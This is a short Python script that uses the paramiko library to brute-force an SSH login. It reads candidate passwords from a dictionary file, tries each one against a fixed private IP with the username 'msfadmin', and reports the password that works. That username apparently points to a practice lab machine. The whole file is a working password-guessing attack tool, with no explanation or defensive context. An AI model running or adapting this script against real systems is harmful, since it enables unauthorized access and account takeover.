import paramiko

host='192.168.46.145'

def sshconnect(passwordtotry):

    try:
        client=paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname='192.168.46.145', username = 'msfadmin',password=passwordtotry)

    except paramiko.ssh_exception.AuthenticationException:
        return False
    else:
        return True


f=open('password.dic','r')
for word in f:
    print("trying password %s ..." %word)
    if sshconnect(word.strip()):
        print("Password found:", word)
        f.close()
        exit(0)
print("Password not found in your dictionary")
f.close()
